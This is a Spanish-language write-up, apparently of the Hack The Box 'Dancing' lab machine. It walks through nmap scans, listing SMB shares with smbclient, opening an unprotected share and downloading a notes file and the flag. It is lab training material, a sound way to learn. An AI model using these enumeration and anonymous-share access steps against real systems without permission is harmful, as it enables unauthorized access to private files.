---
title: Dancing
author: d3vjh
date: 2024-02-15 12:00:00 +0000
categories: [Security, HTB]
tags: [Windows, Enumeration, Exploitation]
img_path: /assets/img/commons/Dancing/
image: Dancing.png
---

## Recopilación de información

![Untitled](1.png)

```bash
❯ ping -c 1 10.129.197.183
PING 10.129.197.183 (10.129.197.183) 56(84) bytes of data.
64 bytes from 10.129.197.183: icmp_seq=1 ttl=127 time=84.5 ms


--- 10.129.197.183 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 84.479/84.479/84.479/0.000 ms
```

De esta traza `ICMP` podemos obtener que, debido al `ttl=127`, estamos frente a una máquina Windows.

Hacemos un escaneo con la herramienta **nmap**:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.197.183 -oG allPorts
```

Resultado:
```bash
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  msrpc        syn-ack ttl 127
49665/tcp open  msrpc        syn-ack ttl 127
49666/tcp open  msrpc        syn-ack ttl 127
49667/tcp open  msrpc        syn-ack ttl 127
49668/tcp open  msrpc        syn-ack ttl 127
49669/tcp open  msrpc        syn-ack ttl 127
```

Luego, realizamos un escaneo más detallado para identificar versiones y servicios:

```bash
nmap -sCV -p135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.129.197.183 -oN targeted
```

Resultado:
```bash
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? 
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
...
```

## Análisis de vulnerabilidades

Por el puerto `445`, encontramos que está corriendo `microsoft-ds?`, relacionado con `SMB`. Este servicio puede ser explotado para compartir recursos en la red. Usando `smbclient`, listamos los servicios disponibles:

```bash
smbclient -L 10.129.197.183
```

Salida:
```bash
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk
```

Nos conectamos al recurso `WorkShares`:

```bash
smbclient \\\\10.129.197.183\\WorkShares
```

Salida:
```bash
smb: \> ls
  .                                   D        0  ...
  Amy.J                               D        0  ...
  James.P                             D        0  ...
```

## Explotación de vulnerabilidades

Entramos al directorio `Amy.J` y descargamos un archivo:

```bash
smb: \Amy.J\> get worknotes.txt
```

Hacemos lo mismo en `James.P`:

```bash
smb: \James.P\> get flag.txt
```

## Post-Explotación

Revisamos los archivos descargados y analizamos el contenido:

![Archivo 1](2.png)  
![Archivo 2](3.png)

